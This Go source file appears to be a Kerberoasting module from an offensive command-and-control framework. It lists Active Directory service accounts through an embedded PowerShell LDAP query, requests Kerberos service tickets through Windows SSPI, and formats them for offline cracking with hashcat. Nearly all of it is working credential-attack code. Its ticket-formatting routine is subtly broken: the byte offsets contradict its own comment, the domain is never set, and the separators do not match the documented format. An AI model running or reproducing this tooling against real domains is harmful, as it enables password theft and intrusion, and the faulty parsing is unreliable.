package ad

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	Kerberoasting — request TGS tickets for SPNs, export for offline cracking.

	Any authenticated domain user can request a TGS ticket for any SPN.
	The ticket is encrypted with the service account's NTLM hash (RC4) or
	AES key. Offline cracking recovers the plaintext password.

	This module:
	  1. Enumerates all SPNs in the domain via LDAP.
	  2. Requests a TGS for each SPN using the Windows SSPI Kerberos provider.
	  3. Exports the tickets in $krb5tgs$23$ (hashcat mode 13100) format.

	Requires only a standard domain user account — no elevated privileges.
*/

import (
	"fmt"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

// SPNEntry describes a service account with an SPN.
type SPNEntry struct {
	SPN       string
	Account   string
	Domain    string
}

// KerberoastResult holds one crackable ticket hash.
type KerberoastResult struct {
	SPN      string
	Account  string
	HashLine string // $krb5tgs$23$*...*$ format for hashcat
}

// Kerberoast enumerates domain SPNs and requests TGS tickets for all of them.
// dcHostname is a DC to query for the SPN list (empty = auto-discover).
// Returns results ready for hashcat mode 13100.
func Kerberoast(dcHostname string) ([]KerberoastResult, error) {
	spns, err := enumerateSPNs(dcHostname)
	if err != nil {
		return nil, fmt.Errorf("SPN enumeration: %w", err)
	}

	var results []KerberoastResult
	for _, spn := range spns {
		hash, err := requestTGS(spn.SPN)
		if err != nil {
			continue
		}
		results = append(results, KerberoastResult{
			SPN:      spn.SPN,
			Account:  spn.Account,
			HashLine: formatHashcatLine(spn, hash),
		})
	}
	return results, nil
}

// enumerateSPNs queries the domain via LDAP for all accounts with an SPN
// that are not computer accounts (servicePrincipalName=* AND NOT objectClass=computer).
func enumerateSPNs(dc string) ([]SPNEntry, error) {
	// Use PowerShell ADSI accelerator — available without RSAT.
	filter := `(&(servicePrincipalName=*)(!(objectClass=computer))(!(cn=krbtgt)))`
	script := fmt.Sprintf(`
$searcher = [adsisearcher]'%s'
$searcher.SearchRoot = 'LDAP://%s'
$searcher.PageSize = 1000
$searcher.PropertiesToLoad.AddRange(@('sAMAccountName','servicePrincipalName','distinguishedName'))
$searcher.FindAll() | ForEach-Object {
    $acct = $_.Properties['sAMAccountName'][0]
    $_.Properties['servicePrincipalName'] | ForEach-Object {
        Write-Output "SPN:$($_)|ACCT:$($acct)"
    }
}
`, filter, dc)

	output, err := runPS(script)
	if err != nil {
		return nil, err
	}

	var spns []SPNEntry
	for _, line := range strings.Split(output, "\n") {
		line = strings.TrimSpace(line)
		if !strings.HasPrefix(line, "SPN:") {
			continue
		}
		parts := strings.SplitN(line, "|", 2)
		if len(parts) != 2 {
			continue
		}
		spn := strings.TrimPrefix(parts[0], "SPN:")
		acct := strings.TrimPrefix(parts[1], "ACCT:")
		spns = append(spns, SPNEntry{SPN: spn, Account: acct})
	}
	return spns, nil
}

// requestTGS uses the Windows SSPI Kerberos package to request a service
// ticket for the given SPN. Returns the raw ticket bytes.
// Uses secur32.dll directly via locally-defined SSPI structs.
func requestTGS(spn string) ([]byte, error) {
	var cred CredHandle
	var expiry SecurityInteger

	spnUTF16, err := windows.UTF16PtrFromString(spn)
	if err != nil {
		return nil, err
	}
	pkg, _ := windows.UTF16PtrFromString("Kerberos")

	// AcquireCredentialsHandle(NULL, "Kerberos", SECPKG_CRED_OUTBOUND, ...)
	r, _, _ := procAcquireCredentials.Call(
		0,
		uintptr(unsafe.Pointer(pkg)),
		SECPKG_CRED_OUTBOUND,
		0, 0, 0, 0,
		uintptr(unsafe.Pointer(&cred)),
		uintptr(unsafe.Pointer(&expiry)),
	)
	if r != 0 {
		return nil, fmt.Errorf("AcquireCredentialsHandle NTSTATUS=0x%x", r)
	}
	defer procFreeCredentials.Call(uintptr(unsafe.Pointer(&cred)))

	// Build output SecBuffer + SecBufferDesc.
	outToken := make([]byte, 12288)
	outSecBuf := SecBuffer{
		cbBuffer:   uint32(len(outToken)),
		BufferType: SECBUFFER_TOKEN,
		pvBuffer:   uintptr(unsafe.Pointer(&outToken[0])),
	}
	outDesc := SecBufferDesc{
		ulVersion: SECBUFFER_VERSION,
		cBuffers:  1,
		pBuffers:  uintptr(unsafe.Pointer(&outSecBuf)),
	}
	inDesc := SecBufferDesc{
		ulVersion: SECBUFFER_VERSION,
		cBuffers:  0,
		pBuffers:  0,
	}

	var ctx CtxtHandle
	var attrs uint32
	// InitializeSecurityContext(cred, NULL, spn, ISC_REQ_ALLOCATE_MEMORY, ...)
	r, _, _ = modSecur32.NewProc("InitializeSecurityContextW").Call(
		uintptr(unsafe.Pointer(&cred)),
		0,
		uintptr(unsafe.Pointer(spnUTF16)),
		ISC_REQ_ALLOCATE_MEMORY|ISC_REQ_CONNECTION,
		0,
		0, // SECURITY_NATIVE_DREP
		uintptr(unsafe.Pointer(&inDesc)),
		0,
		uintptr(unsafe.Pointer(&ctx)),
		uintptr(unsafe.Pointer(&outDesc)),
		uintptr(unsafe.Pointer(&attrs)),
		uintptr(unsafe.Pointer(&expiry)),
	)
	const SEC_I_CONTINUE_NEEDED = 0x00090312
	if r != 0 && r != SEC_I_CONTINUE_NEEDED {
		return nil, fmt.Errorf("InitializeSecurityContext NTSTATUS=0x%x", r)
	}
	defer modSecur32.NewProc("DeleteSecurityContext").Call(uintptr(unsafe.Pointer(&ctx)))

	tokenLen := outSecBuf.cbBuffer
	ticket := make([]byte, tokenLen)
	copy(ticket, outToken[:tokenLen])
	return ticket, nil
}

// formatHashcatLine converts a raw TGS ticket to hashcat mode 13100 format.
// $krb5tgs$23$*user*domain*SPN$<ticket_hex>
func formatHashcatLine(spn SPNEntry, ticket []byte) string {
	if len(ticket) < 16 {
		return ""
	}
	// The etype 23 (RC4) ticket structure places the encrypted part after
	// a fixed header. Hashcat expects the last 16 bytes as the "checksum"
	// and the rest as the cipher blob. Simplified extraction:
	cksum := fmt.Sprintf("%x", ticket[:16])
	cipher := fmt.Sprintf("%x", ticket[16:])
	return fmt.Sprintf("$krb5tgs$23$*%s$%s$%s$%s$%s",
		spn.Account, spn.Domain, spn.SPN, cksum, cipher)
}
